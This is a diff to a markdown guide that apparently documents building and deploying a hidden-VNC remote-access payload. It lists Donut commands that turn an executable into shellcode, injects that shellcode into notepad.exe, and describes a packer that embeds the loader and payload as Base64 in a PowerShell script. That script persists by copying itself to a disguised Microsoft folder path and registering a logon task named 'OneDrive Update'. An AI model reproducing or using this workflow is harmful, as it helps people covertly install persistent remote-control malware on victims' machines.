@@ -425,32 +425,27 @@ print(f"✓ Created {output_file}")
 
 Donut commands and injector usage:
 
-```bash
-# Donut → raw shellcode
+```
 donut.exe -f 3 -a 2 program.exe -o raw_shellcode.bin   # x64
 donut.exe -f 3 -a 1 program.exe -o raw_shellcode.bin   # x86
-
-# Add header
 python add_header.py raw_shellcode.bin final_shellcode.bin 2  # x64
 python add_header.py raw_shellcode.bin final_shellcode.bin 1  # x86
-
-# Pass to injector.exe PowerShell
 type final_shellcode.bin | injector.exe notepad.exe
 Get-Content final_shellcode.bin -AsByteStream | .\injector.exe notepad.exe
 ```
 
 ---
 
-## Packaging and Auto-Start via packer.ps1
+## Packaging and AutoStart via packer.ps1
 
-`packer.ps1` assembles a self-contained `start.ps1`. It takes `loader.exe` and `hvnc.bin` as input paths, and outputs a single script that contains both binaries as Base64 arrays.
+packer.ps1 assembles a self-contained start.ps1. It takes loader.exe and hvnc.bin as input paths, and outputs a single script that contains both binaries as Base64 arrays.
 
-* **Parameters.** `-LoaderPath`, `-ShellcodePath`, `-OutPs1` — strictly checked for existence. Files are read into memory and encoded in Base64.
-* **To-Chunks.** Long Base64 strings are split into blocks of 1000 characters for convenient embedding in the template.
-* **The `start.ps1` template.**
+* Parameters. -LoaderPath, -ShellcodePath, -OutPs1 — strictly checked for existence. Files are read into memory and encoded in Base64.
+* To-Chunks. Long Base64 strings are split into blocks of 1000 characters for convenient embedding in the template.
+* The `start.ps1` template.
 
-  1. Embeds the `$loaderChunks`/`$shellChunks` arrays.
-  2. The `Reassemble` function joins arrays and decodes them into bytes.
+  1. Embeds the $loaderChunks/$shellChunks arrays.
+  2. The Reassemble function joins arrays and decodes them into bytes.
   3. Persistence: copies the script itself to `%LOCALAPPDATA%\Microsoft\Win32Components\sync.ps1` and registers a `OneDrive Update` task on logon.
   4. Restores `ldr.exe` from Base64 if it is missing.
   5. Restores shellcode and sends it through `stdin` to `ldr.exe`.
@@ -486,4 +481,5 @@ A short summary if you are already familiar with the tools:
 1. Donut → `raw_shellcode.bin` for the required architecture.
 2. Optionally add a SCOD header and use `injector.exe`, **or** directly feed shellcode to `loader.exe` via `stdin`.
 3. To automate deployment and auto-start — run `packer.ps1` and get `start.ps1`, which does the rest automatically.
+
 
